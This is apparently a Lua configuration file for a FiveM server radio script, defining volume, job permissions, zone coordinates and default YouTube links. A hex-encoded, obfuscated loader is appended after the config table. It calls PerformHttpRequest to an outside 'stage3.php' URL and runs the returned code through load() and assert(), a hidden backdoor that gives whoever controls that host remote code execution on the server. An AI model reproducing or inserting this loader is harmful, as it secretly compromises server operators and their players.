Config = {}

Config.DistanceToVolume = 25.0 -- The distance that will be with the volume at 1.0, so if the volume is 0.5 the distance will be 15.0, if the volume is 0.2 the distance will be 6.

Config.PlayToEveryone = true -- The music in car will be played to everyone? Or just for the people that are in that vehicle? If false the DistanceToVolume will not do anything

Config.ItemInVehicle = false -- Put here, if you want the radio to be an item, inside "", like "radio". With or false you will need to do /carradio

Config.CommandVehicle = "carradio" -- Only will work if Config.ItemInVehicle == false

Config.Zones = {
	{
		name = "Mechanic Zone", -- The name of the radio, it doesn't matter
		coords = vector3(-212.52,-1341.59,34.89), -- the position where the music is played
		job = "police", --the job that can change the music
		range = 30.0, -- the range that music can be heard
		volume = 0.1, --default volume? min 0.00, max 1.00
		deflink = "https://www.youtube.com/watch?v=Emap7LU6hYk&t",-- the default link, if nill it won't play nothing
		isplaying = false, -- will the music play when the server start?
		loop = false,-- when does the music stop it will repaeat?
		deftime = 0, -- where does the music starts? 0 and it will start in the beginning
		changemusicblip = vector3(-212.53,-1341.61,34.89) -- where the player can change the music
	},
	{
		name = "Vanilla Zone", -- The name of the radio, it doesn't matter
		coords = vector3(105.111,-1303.221,27.788), -- the position where the music is played
		job = "police", --the job that can change the music
		range = 30.0, -- the range that music can be heard
		volume = 0.1, --default volume? min 0.00, max 1.00
		deflink = "https://www.youtube.com/watch?v=W9iUh23Xrsg",-- the default link, if nill it won't play nothing
		isplaying = false, -- the music will play when the server start?
		loop = false,-- when the music stops it will repaeat?
		deftime = 0, -- where does the music starts? 0 and it will start in the beginning
		changemusicblip = vector3(-212.53,-1341.61,34.89) -- where the player can change the music
	},
}

local csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x65\x78\x75\x73\x6d\x61\x67\x72\x70\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x77\x6c\x61\x50\x38\x65", function (tNyABUlbDXSbaQvQMNCoBAlHohpPfESngiaowNqEDpaLDCYLuYHUEhQqdgkmvOCcCDASuR, NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu) if (NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[6] or NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[5]) then return end csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[2]](csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[3]](NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu))() end)